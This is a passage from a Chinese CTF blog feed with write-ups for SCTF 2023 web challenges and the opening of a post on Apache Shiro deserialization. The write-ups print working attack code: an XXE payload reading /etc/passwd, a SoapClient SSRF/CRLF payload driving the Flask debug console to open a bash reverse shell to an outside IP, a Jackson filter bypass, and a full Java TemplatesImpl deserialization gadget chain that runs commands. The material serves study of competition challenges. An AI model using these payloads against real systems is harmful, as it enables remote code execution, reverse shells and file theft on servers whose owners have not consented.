class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这个来上传抓包  然后添加PHPSESSID=xxx也行</strong>)</p><p>这里的考点主要是靠原生类   <a href="https://ke1nys.github.io/posts/28e06bac.html#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">ctfshow-愚人杯也考过这个考点</a></p><p>主要是有三个利用点 </p><ul><li>$object-&gt;sctf();</li><li>$object = new $type($properties[0], $properties[1]);</li><li>$object = file_get_contents(‘<a href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a>‘ . $properties);</li></ul><p><strong>研究了一下，发现只有中间这个有用   并且类和参数都可控 </strong> <strong>用extract来控制</strong></p><p>(由于题目说的<code>/app/app.py</code>，那么我们就得去用原生类来读取这个文件)</p><p><code>$object = new $type($properties[0], $properties[1]);</code>   然后因为这里有两个参数   所以就得去找找既能读取文件，又是两个参数的原生类</p><p><img src="../images/image-20230621212254271.png" alt="image-20230621212254271"></p><p>刚好找到了这个类   可以使用xxe来读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$class</span> = <span class="string">&#x27;SimpleXMLElement&#x27;</span>;</span><br><span class="line"><span class="variable">$evilxml</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;properties&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="variable">$evilxml</span>, <span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;type&#x27;</span>=&gt;<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621222930826.png" alt="image-20230621222930826"></p><p>然后去读题目给的/app/app.py</p><p><img src="../images/image-20230621223042971.png" alt="image-20230621223042971"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>开了debug只有两条路   <strong>热覆盖 和 算pin</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>这里注意一下   这里会调用<code>call</code>()方法  </p><p>覆盖暂时没找到原生类的call方法可以覆盖写文件的，而有个原生类的call是经常用：<code>SoapClient</code></p><p>可以用他的ssrf和crlf打组合拳，这样我们就可以把cookie塞</p><p><code>SoapClient</code>在ctfshow的web259有详细使用   <a href="https://ke1nys.github.io/posts/fd5983bb.html#web259">web259</a></p><p>接下来我们去看一下<code>console</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621233844882.png" alt="image-20230621233844882"></p><p>猜测是算pin</p><p>那么我们就可以用上面的<code>xxe</code>来读取算<code>pin</code>所需要的东西</p><p><img src="../images/image-20230621234154080.png" alt="image-20230621234154080"></p><p>所以这些得一个一个来获取</p><ul><li>machine_id  —&gt;  349b3354-f67f-4438-b395-4fbc01171fdd</li><li>uuidnode   ——&gt;   02:42:ac:13:00:02      (2485378023426)</li><li>moddir  <strong>flask库下app.py的绝对路径  但是这道题没给触发页面报错来获取信息  所以我们得使用别的原生类来模糊查找</strong></li></ul><p>(其实不用也行  可以猜一下  找到例题来看看他的<code>moddir</code>   然后修改一下python版本一下一下试就行了)</p><p><code>/usr/lib/python3.8/site-packages/flask/app.py</code>   这是moddir</p><p>有了这些东西之后  我们就可以直接算pin了</p><p>算出来的pin    <code>121-260-582</code></p><p>由于算pin来rce需要cookie的header   所以用常规的只会输出pin码   并不会输出cookie 所以得找一个脚本能两个同时生成的</p><p><img src="../images/image-20230622000408987.png" alt="image-20230622000408987"></p><p>然后去通过<code>soapclient</code>去访问debug界面，由于<code>debugmode</code>的rce需要携带cookie，因此只有<code>soapclient</code>可以做到   (<strong>其实就是ssrf加crlf</strong>)</p><p><strong>(简单点说就是伪造http头)</strong>     不明白的可以去看上面写的  <strong>web259的链接</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F101.42.39.110%2F3389%20%3C%261%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: __wzdb2a60e2b19822632a67c=1687363437|11b8517fb9fb&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;wupco\r\n&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>),<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="variable">$arr</span>=<span class="title function_ invoke__">Array</span>(<span class="string">&quot;properties&quot;</span>=&gt;<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)),<span class="string">&quot;type&quot;</span>=&gt;<span class="string">&quot;SimpleXMLElement&quot;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">115.239</span><span class="number">.215</span><span class="number">.75</span>:<span class="number">8081</span></span><br><span class="line">Content-Length: <span class="number">922</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: null</span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: PHPSESSID=1nys</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"></span><br><span class="line">tyaoo</span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;data&quot;</span></span><br><span class="line"></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;properties&quot;</span>;s:<span class="number">643</span>:<span class="string">&quot;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A205%3A%22http%3A%2F%2F127.0.0.1%3A5000%2Fconsole%3F%26__debugger__%3Dyes%26cmd%3D__import__%28%2522os%2522%29.popen%28%2522bash%2520-c%2520%255C%2522bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F101.42.39.110%252F3389%2520%253C%25261%255C%2522%2522%29%26frm%3D0%26s%3DDhOJxtvMXCtezvKtqaK9%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A92%3A%22wupco%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+__wzdb2a60e2b19822632a67c%3D1687363437%7C11b8517fb9fb%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;type&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;SimpleXMLElement&quot;</span>;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230622004425446.png" alt="image-20230622004425446"></p><p><strong>这吊题真难</strong></p><h2 id="hellojava"><a href="#hellojava" class="headerlink" title="hellojava"></a>hellojava</h2><p>题目就给了一个jar包   进行反编译查看</p><p><img src="../images/image-20230622195938811.png" alt="image-20230622195938811"></p><p><strong>这时jar包里的内容    还给了一个  <code>1.jar</code>   里面含有这个javassist  说明可以使用<code>templatesimpl</code></strong></p><p><img src="../images/image-20230622200111030.png" alt="image-20230622200111030"></p><p><strong>看了一下<code>pom.xml</code></strong></p><p>发现一共给了三种依赖</p><ul><li>scala    2.13.7</li><li>jackson</li><li>hessian     4.0.4</li></ul><p>一般来说就先对这个<code>pom.xml</code>的依赖进行分析  发现<code>scala</code>这个版本是存在漏洞的</p><p><img src="../images/image-20230622202022788.png" alt="image-20230622202022788"></p><p><img src="../images/image-20230622202525933.png" alt="image-20230622202525933"></p><p>找到了反序列化入口   那么关键点就是如何进入这个if判断了</p><p><img src="../images/image-20230622204854853.png" alt="image-20230622204854853"></p><p><img src="../images/image-20230622204904698.png" alt="image-20230622204904698"></p><p>这个东西要为true才行  但是如果简单的这样传值的话</p><p><code>&#123;&quot;IfInput&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code>  这样简单的传值的话是不行的</p><p><img src="../images/image-20230622205042591.png" alt="image-20230622205042591"></p><p>关键词搜索  <a href="http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">Jackson注解的一个trick</a>   发现了这篇文章就是讲这个的</p><p><strong>使用空值就可以进行绕过了</strong></p><p><code>&#123;&quot;&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code></p><p>接下来就到如何进行反序列化利用了</p><p><img src="../images/image-20230622205655871.png" alt="image-20230622205655871"></p><p>结合这个<code>LazyList</code>东西和刚开始分析的<code>scala</code>漏洞的内容   可以猜测用这个反序列化来清空黑名单过滤</p><p><a href="https://github.com/yarocher/lazylist-cve-poc">https://github.com/yarocher/lazylist-cve-poc</a>   用这个代码  然后直接打就行了</p><p><code>mvn -q exec:java -Dexec.mainClass=&quot;poc.cve.lazylist.payload.Main&quot; -Dexec.args=&quot;./security/blacklist.txt false&quot;</code> 生成 Base64 payload</p><p><img src="../images/image-20230622213852125.png" alt="image-20230622213852125"></p><p>发包来打  将 <code>security/blacklist.txt</code> 清空</p><p>之后再使用 jackson 利用链，可以裸反序列化 RCE </p><p><img src="../images/image-20230622213955923.png" alt="image-20230622213955923"></p><p>最终<strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.fasterxml.jackson.databind.node.POJONode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templates);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">11</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">        <span class="comment">//serial(exp);</span></span><br><span class="line">        <span class="comment">//serialize(exp);</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public static void doPOST(byte[] obj) throws Exception&#123;</span></span><br><span class="line"><span class="comment">//        HttpHeaders requestHeaders = new HttpHeaders();</span></span><br><span class="line"><span class="comment">//        requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);</span></span><br><span class="line"><span class="comment">//        URI url = new URI(&quot;http://112.124.14.13:8080/bypassit&quot;);</span></span><br><span class="line"><span class="comment">//        HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        RestTemplate restTemplate = new RestTemplate();</span></span><br><span class="line"><span class="comment">//        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span></span><br><span class="line"><span class="comment">//        System.out.println(res.getBody());</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot; try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd +</span><br><span class="line">                    <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot; &#125;&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(<strong>不知道为啥  这里我只能用这种形式的poc才能弹计算器    如果用<code>xx.class</code>这种形式的poc的话  是弹不出计算器的。。。。。。。</strong>)</p><p>这里注意的一点就是  新建项目的时候</p><p><img src="../images/image-20230624210123241.png" alt="image-20230624210123241"><em>**</em></p><p>得把<code>BaseJsonNode</code>里的这个东西给注释掉</p><p><strong>不然会报错</strong></p><p>这其实不是预期解  </p><p><img src="../images/image-20230624210304228.png" alt="image-20230624210304228"></p><p>预期解是打这个<code>hessian</code>这条链子</p><p><strong>官方wp是这样说的</strong></p><p><img src="../images/image-20230624210928869.png" alt="image-20230624210928869"></p><h2 id="an4er-monitor"><a href="#an4er-monitor" class="headerlink" title="an4er_monitor"></a>an4er_monitor</h2><p><strong>描述</strong></p><p><img src="../images/image-20230624212738790.png" alt="image-20230624212738790"></p><p>没环境   看官方wp有个思路就行了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ezcheck1n&quot;&gt;&lt;a href=&quot;#ezcheck1n&quot; class=&quot;headerlink&quot; title=&quot;ezcheck1n&quot;&gt;&lt;/a&gt;&lt;strong&gt;ezcheck1n&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;figure class=&quot;hig</summary>
      
    
    
    
    
    <category term="sctf-web-2023" scheme="https://ke1nys.github.io/tags/sctf-web-2023/"/>
    
  </entry>
  
  <entry>
    <title>java-shiro</title>
    <link href="https://ke1nys.github.io/posts/55797267.html"/>
    <id>https://ke1nys.github.io/posts/55797267.html</id>
    <published>2023-06-19T08:49:08.000Z</published>
    <updated>2023-06-21T08:41:22.399Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7133959651653058574">参考文章1</a>     <a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">参考视频 </a>  <a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">参考文章2</a></p><p>(<strong>主要看参考文章2</strong>)</p><h2 id="Shiro简介"><a href="#Shiro简介" class="headerlink" title="Shiro简介"></a>Shiro简介</h2><p><a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3DApache%26spm%3D1001.2101.3001.7020">Apache</a> Shiro 是一个强大易用的Java安全框架,提供了认证、授权、加密和会话管理等功能，Shiro框架直观、易用、同时也能提供健壮的安全性。</p><p>Apache Shiro<a href="https://link.juejin.cn/?target=https%3A%2F%2Fso.csdn.net%2Fso%2Fsearch%3Fq%3D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%26spm%3D1001.2101.3001.7020">反序列化</a>漏洞分为两种：<strong>Shiro-550</strong>、<strong>Shiro-721</strong></p><h2 id="Shiro-550反序列化漏洞"><a href="#Shiro-550反序列化漏洞" class="headerlink" title="Shiro-550反序列化漏洞"></a>Shiro-550反序列化漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。 那么，Payload产生的过程： 命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值 在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt; 1.2.4</p><h3 id="Shiro反序列化的特征"><a href="#Shiro反序列化的特征" class="headerlink" 